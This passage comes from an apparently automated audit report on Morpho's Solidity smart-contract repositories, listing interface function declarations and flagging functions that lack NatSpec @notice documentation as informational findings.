```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

5:     function deposit() external payable;

6:     function withdraw(uint256 wad) external;

7:     function approve(address guy, uint256 wad) external returns (bool);

8:     function transferFrom(address src, address dst, uint256 wad) external returns (bool);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L5), [6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L6), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L8)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

5:     function DOMAIN_SEPARATOR() external view returns (bytes32);

7:     function allowance(address owner, address spender) external view returns (uint256);

8:     function approve(address spender, uint256 amount) external returns (bool);

9:     function balanceOf(address account) external view returns (uint256);

10:     function decimals() external view returns (uint8);

11:     function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

12:     function getStETHByWstETH(uint256 wstETHAmount) external view returns (uint256);

13:     function getWstETHByStETH(uint256 stETHAmount) external view returns (uint256);

14:     function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

15:     function name() external view returns (string memory);

16:     function nonces(address owner) external view returns (uint256);

17:     function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)

19:     function stETH() external view returns (address);

20:     function stEthPerToken() external view returns (uint256);

21:     function symbol() external view returns (string memory);

22:     function tokensPerStEth() external view returns (uint256);

23:     function totalSupply() external view returns (uint256);

24:     function transfer(address recipient, uint256 amount) external returns (bool);

25:     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

26:     function unwrap(uint256 wstETHAmount) external returns (uint256);

27:     function wrap(uint256 stETHAmount) external returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L8), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L9), [10](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L10), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L11), [12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L12), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L13), [14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L14), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L15), [16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L16), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L19), [20](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L20), [21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L21), [22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L22), [23](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L23), [24](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L24), [25](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L25), [26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L26), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L27)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

22:     constructor(address morpho) MorphoBundler(morpho) {}

```

[22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L22)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

209:     function initReserve(

217:     function setReserveInterestRateStrategyAddress(address reserve, address rateStrategyAddress) external;

219:     function setConfiguration(address reserve, uint256 configuration) external;

243:     function finalizeTransfer(

252:     function getReservesList() external view returns (address[] memory);

254:     function getAddressesProvider() external view returns (address);

256:     function setPause(bool val) external;

258:     function paused() external view returns (bool);

260:     function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);

```

[209](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L209), [217](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L217), [219](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L219), [243](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L243), [252](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L252), [254](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L254), [256](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L256), [258](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L258), [260](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L260)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

5:     function repayBorrowBehalf(address borrower) external payable;

7:     function balanceOf(address) external view returns (uint256);

9:     function exchangeRateStored() external view returns (uint256);

11:     function redeem(uint256 redeemTokens) external returns (uint256);

13:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

15:     function borrow(uint256 borrowAmount) external returns (uint256);

17:     function mint() external payable;

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L17)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

5:     function underlying() external returns (address);

7:     function balanceOf(address) external view returns (uint256);

9:     function exchangeRateStored() external view returns (uint256);

11:     function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);

13:     function redeem(uint256 redeemTokens) external returns (uint256);

15:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

17:     function borrow(uint256 borrowAmount) external returns (uint256);

19:     function mint(uint256 mintAmount) external returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L19)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

21:     function name() external view returns (string memory);

23:     function version() external view returns (string memory);

25:     function baseToken() external view returns (address);

27:     function userCollateral(address account, address asset) external view returns (uint256);

29:     function balanceOf(address account) external view returns (uint256);

31:     function borrowBalanceOf(address account) external view returns (uint256);

33:     function supply(address asset, uint256 amount) external;

35:     function supplyTo(address dst, address asset, uint256 amount) external;

37:     function supplyFrom(address from, address dst, address asset, uint256 amount) external;

39:     function withdraw(address asset, uint256 amount) external;

41:     function withdrawFrom(address src, address to, address asset, uint256 amount) external;

43:     function allowBySig(

```

[21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L21), [23](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L23), [25](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L25), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L27), [29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L29), [31](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L31), [33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L33), [35](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L35), [37](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L37), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L39), [41](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L41), [43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L43)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

5:     function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L5)

```solidity
File: morpho-blue-irm/src/libraries/MathLib.sol

13:     function wMulDown(int256 a, int256 b) internal pure returns (int256) {

17:     function wDivDown(int256 a, int256 b) internal pure returns (int256) {

```

[13](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L13), [17](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L17)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

7:     function decimals() external view returns (uint8);

9:     function description() external view returns (string memory);

11:     function version() external view returns (uint256);

13:     function getRoundData(uint80 _roundId)

18:     function latestRoundData()

```

[7](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L7), [9](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L9), [11](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L11), [13](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L13), [18](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L18)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

5:     function convertToAssets(uint256) external view returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L5)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

18:     function root() external view returns (bytes32);

19:     function owner() external view returns (address);

20:     function timelock() external view returns (uint256);

21:     function ipfsHash() external view returns (bytes32);

22:     function isUpdater(address) external view returns (bool);

23:     function claimed(address, address) external view returns (uint256);

25:     function acceptRoot() external;

26:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external;

27:     function setTimelock(uint256 newTimelock) external;

28:     function setRootUpdater(address updater, bool active) external;

29:     function revokePendingRoot() external;

30:     function setOwner(address newOwner) external;

32:     function submitRoot(bytes32 newRoot, bytes32 ipfsHash) external;

34:     function claim(address account, address reward, uint256 claimable, bytes32[] memory proof)

43:     function pendingRoot() external view returns (bytes32 root, bytes32 ipfsHash, uint256 validAt);

52:     function pendingRoot() external view returns (PendingRoot memory);

```

[18](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L18), [19](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L19), [20](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L20), [21](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L21), [22](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L22), [23](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L23), [25](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L25), [26](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L26), [27](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L27), [28](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L28), [29](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L29), [30](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L30), [32](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L32), [34](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L34), [43](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L43), [52](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L52)




### Function declaration should include NatSpec `@notice` documentation	_(duplicate of [NatSpec: Functions declarations should have @notice, @param and @return tags and NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (258)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

/// @audit missed @notice
52:     function hasPermission(address account) public view virtual returns (bool) {

/// @audit missed @notice
58:     function decimals() public view virtual override(ERC20, ERC20Wrapper) returns (uint8) {

/// @audit missed @notice
66:     function _update(address from, address to, uint256 value) internal virtual override {

```

[52](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L52), [58](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L58), [66](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L66)

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit missed @notice
118:     constructor(

/// @audit missed @notice
526:     function decimals() public view override(ERC20, ERC4626) returns (uint8) {

/// @audit missed @notice
531:     function maxDeposit(address) public view override returns (uint256) {

/// @audit missed @notice
536:     function maxMint(address) public view override returns (uint256) {

/// @audit missed @notice
545:     function maxWithdraw(address owner) public view override returns (uint256 assets) {

/// @audit missed @notice
552:     function maxRedeem(address owner) public view override returns (uint256) {

/// @audit missed @notice
559:     function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {

/// @audit missed @notice
572:     function mint(uint256 shares, address receiver) public override returns (uint256 assets) {

/// @audit missed @notice
585:     function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {

/// @audit missed @notice
599:     function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {

/// @audit missed @notice
613:     function totalAssets() public view override returns (uint256 assets) {

/// @audit missed @notice
622:     function _decimalsOffset() internal pure override returns (uint8) {

/// @audit missed @notice
628:     function _maxWithdraw(address owner)

/// @audit missed @notice
642:     function _maxDeposit() internal view returns (uint256 totalSuppliable) {

/// @audit missed @notice
657:     function _convertToShares(uint256 assets, Math.Rounding rounding) internal view override returns (uint256) {

/// @audit missed @notice
665:     function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view override returns (uint256) {

/// @audit missed @notice
673:     function _convertToSharesWithTotals(

/// @audit missed @notice
684:     function _convertToAssetsWithTotals(

/// @audit missed @notice
695:     function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {

/// @audit missed @notice
711:     function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)

/// @audit missed @notice
723:     function _marketParams(Id id) internal view returns (MarketParams memory) {

/// @audit missed @notice
730:     function _accruedSupplyBalance(MarketParams memory marketParams, Id id)

/// @audit missed @notice
742:     function _checkTimelockBounds(uint256 newTimelock) internal pure {

/// @audit missed @notice
748:     function _setTimelock(uint256 newTimelock) internal {

/// @audit missed @notice
757:     function _setGuardian(address newGuardian) internal {

/// @audit missed @notice
766:     function _setCap(Id id, uint184 supplyCap) internal {

/// @audit missed @notice
797:     function _supplyMorpho(uint256 assets) internal {

/// @audit missed @notice
823:     function _withdrawMorpho(uint256 assets) internal {

/// @audit missed @notice
848:     function _simulateWithdrawMorpho(uint256 assets) internal view returns (uint256) {

/// @audit missed @notice
878:     function _withdrawable(

/// @audit missed @notice
895:     function _updateLastTotalAssets(uint256 updatedTotalAssets) internal {

/// @audit missed @notice
903:     function _accrueFee() internal returns (uint256 newTotalAssets) {

/// @audit missed @notice
914:     function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {

```

[118](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L118), [526](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L526), [531](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L531), [536](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L536), [545](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L545), [552](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L552), [559](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559), [572](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L572), [585](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L585), [599](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L599), [613](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L613), [622](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L622), [628](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L628), [642](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L642), [657](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L657), [665](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L665), [673](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L673), [684](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L684), [695](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L695), [711](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L711), [723](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L723), [730](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L730), [742](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L742), [748](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L748), [757](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L757), [766](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L766), [797](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L797), [823](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L823), [848](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L848), [878](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L878), [895](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L895), [903](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L903), [914](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L914)

```solidity
File: metamorpho/src/MetaMorphoFactory.sol

/// @audit missed @notice
28:     constructor(address morpho) {

```

[28](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L28)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

/// @audit missed @notice
19:     function multicall(bytes[] calldata) external returns (bytes[] memory);

/// @audit missed @notice
23:     function owner() external returns (address);

/// @audit missed @notice
24:     function transferOwnership(address) external;

/// @audit missed @notice
25:     function renounceOwnership() external;

/// @audit missed @notice
26:     function acceptOwnership() external;

/// @audit missed @notice
27:     function pendingOwner() external view returns (address);

/// @audit missed @notice
33:     function MORPHO() external view returns (IMorpho);

/// @audit missed @notice
35:     function curator() external view returns (address);

/// @audit missed @notice
36:     function isAllocator(address target) external view returns (bool);

/// @audit missed @notice
37:     function guardian() external view returns (address);

/// @audit missed @notice
39:     function fee() external view returns (uint96);

/// @audit missed @notice
40:     function feeRecipient() external view returns (address);

/// @audit missed @notice
41:     function skimRecipient() external view returns (address);

/// @audit missed @notice
42:     function timelock() external view returns (uint256);

/// @audit missed @notice
43:     function supplyQueue(uint256) external view returns (Id);

/// @audit missed @notice
44:     function supplyQueueLength() external view returns (uint256);

/// @audit missed @notice
45:     function withdrawQueue(uint256) external view returns (Id);

/// @audit missed @notice
46:     function withdrawQueueLength() external view returns (uint256);

/// @audit missed @notice
48:     function lastTotalAssets() external view returns (uint256);

/// @audit missed @notice
50:     function submitTimelock(uint256 newTimelock) external;

/// @audit missed @notice
51:     function acceptTimelock() external;

/// @audit missed @notice
52:     function revokePendingTimelock() external;

/// @audit missed @notice
54:     function submitCap(MarketParams memory marketParams, uint256 supplyCap) external;

/// @audit missed @notice
55:     function acceptCap(Id id) external;

/// @audit missed @notice
56:     function revokePendingCap(Id id) external;

/// @audit missed @notice
58:     function submitMarketRemoval(Id id) external;

/// @audit missed @notice
59:     function revokePendingMarketRemoval(Id id) external;

/// @audit missed @notice
61:     function submitGuardian(address newGuardian) external;

/// @audit missed @notice
62:     function acceptGuardian() external;

/// @audit missed @notice
63:     function revokePendingGuardian() external;

/// @audit missed @notice
65:     function skim(address) external;

/// @audit missed @notice
67:     function setIsAllocator(address newAllocator, bool newIsAllocator) external;

/// @audit missed @notice
68:     function setCurator(address newCurator) external;

/// @audit missed @notice
69:     function setFee(uint256 newFee) external;

/// @audit missed @notice
70:     function setFeeRecipient(address newFeeRecipient) external;

/// @audit missed @notice
71:     function setSkimRecipient(address) external;

/// @audit missed @notice
73:     function setSupplyQueue(Id[] calldata newSupplyQueue) external;

/// @audit missed @notice
74:     function updateWithdrawQueue(uint256[] calldata indexes) external;

/// @audit missed @notice
75:     function reallocate(MarketAllocation[] calldata allocations) external;

/// @audit missed @notice
81:     function config(Id) external view returns (uint184 cap, bool enabled, uint64 removableAt);

/// @audit missed @notice
82:     function pendingGuardian() external view returns (address guardian, uint64 validAt);

/// @audit missed @notice
83:     function pendingCap(Id) external view returns (uint192 value, uint64 validAt);

/// @audit missed @notice
84:     function pendingTimelock() external view returns (uint192 value, uint64 validAt);

/// @audit missed @notice
92:     function config(Id) external view returns (MarketConfig memory);

/// @audit missed @notice
93:     function pendingGuardian() external view returns (PendingAddress memory);

